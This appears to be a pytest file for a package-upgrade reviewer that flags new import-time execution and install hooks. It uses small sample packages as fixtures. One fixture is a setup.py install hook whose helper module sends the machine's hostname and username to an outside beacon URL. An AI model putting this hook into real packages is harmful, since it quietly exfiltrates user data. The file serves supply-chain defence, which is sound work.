from __future__ import annotations

import pytest
from tests.test_upgrade_review import _kinds, _one, registry

from ca9.review import upgrade_rules

__all__ = ["registry"]

RUN = "import subprocess\nsubprocess.Popen(['uname', '-a'])\n"
BACKGROUND = "import atexit, signal, subprocess, threading\n\ndef _bg():\n    subprocess.Popen(['uname', '-a'])\n\n"


def _wheel_upgrade(registry, name, old, new):
    registry.pypi(name, "1.0", wheel=old)
    registry.pypi(name, "1.1", wheel=new)
    return _one("pypi", name, "1.0", "1.1")[0]


def test_namespace_package_modules_are_import_roots(registry):
    result = _wheel_upgrade(
        registry,
        "nsdist",
        {"nsdist/client/__init__.py": "X = 1\n", "nsdist/client/models.py": "Y = 1\n"},
        {"nsdist/client/__init__.py": "X = 1\n" + RUN, "nsdist/client/models.py": "Y = 1\n"},
    )

    assert _kinds(result, "block") == ["new_import_time_exec"]
    assert result["block"][0]["path"] == "nsdist/client/__init__.py"


@pytest.mark.parametrize(
    "start",
    [
        "threading.Thread(target=_bg, daemon=True).start()\n",
        "threading.Timer(1.0, _bg).start()\n",
        "threading.Thread(target=lambda: _bg()).start()\n",
        "atexit.register(_bg)\n",
        "signal.signal(signal.SIGTERM, _bg)\n",
    ],
)
def test_functions_started_or_registered_at_import_count_as_import_time(registry, start):
    result = _wheel_upgrade(
        registry,
        "bgdist",
        {"bgdist/__init__.py": "X = 1\n"},
        {"bgdist/__init__.py": BACKGROUND + start},
    )

    assert _kinds(result, "block") == ["new_import_time_exec"]


def test_decorated_exit_handler_counts_as_import_time(registry):
    code = (
        "import atexit, subprocess\n\n@atexit.register\ndef _bye():\n    subprocess.Popen(['id'])\n"
    )

    result = _wheel_upgrade(
        registry, "exitdist", {"exitdist/__init__.py": "X = 1\n"}, {"exitdist/__init__.py": code}
    )

    assert _kinds(result, "block") == ["new_import_time_exec"]


def test_threads_started_only_from_functions_stay_quiet(registry):
    code = BACKGROUND + "def serve():\n    threading.Thread(target=_bg).start()\n"

    result = _wheel_upgrade(
        registry, "lazydist", {"lazydist/__init__.py": "X = 1\n"}, {"lazydist/__init__.py": code}
    )

    assert result["block"] == [] and result["warn"] == []


def test_setup_py_cmdclass_run_and_the_modules_it_imports_are_install_time(registry):
    plain = "from setuptools import setup\nsetup(name='cmd')\n"
    hooked = (
        "from setuptools import setup\nfrom setuptools.command.install import install\n\n"
        "class Install(install):\n"
        "    def run(self):\n"
        "        import helper\n"
        "        helper.main()\n"
        "        install.run(self)\n\n"
        "setup(name='cmd', cmdclass={'install': Install})\n"
    )
    helper = (
        "import getpass, socket, urllib.request\n\n"
        "def main():\n"
        "    urllib.request.urlopen('https://beacon.svc.dev/?h=' + socket.gethostname() + getpass.getuser())\n"
    )
    registry.pypi("cmdpkg", "1.0", sdist={"setup.py": plain, "cmdpkg/__init__.py": "X = 1\n"})
    registry.pypi(
        "cmdpkg",
        "1.1",
        sdist={"setup.py": hooked, "helper.py": helper, "cmdpkg/__init__.py": "X = 1\n"},
    )

    result, _ = _one("pypi", "cmdpkg", "1.0", "1.1")

    paths = {delta["path"] for delta in result["block"] if delta["kind"] == "new_install_hook"}
    assert "helper.py" in paths


def test_import_graph_cap_reviews_changed_modules_first_and_is_incomplete(registry, monkeypatch):
    monkeypatch.setattr(upgrade_rules, "MAX_IMPORT_MODULES", 3)
    old = {f"capdist_{index}.py": "X = 1\n" for index in range(10)}
    new = {**old, "capdist_7.py": RUN}

    result = _wheel_upgrade(registry, "capdist", old, new)

    assert _kinds(result, "block") == ["new_import_time_exec"]
    assert result["complete"] is False
    assert any("import-time analysis stopped" in item for item in result["limitations"])
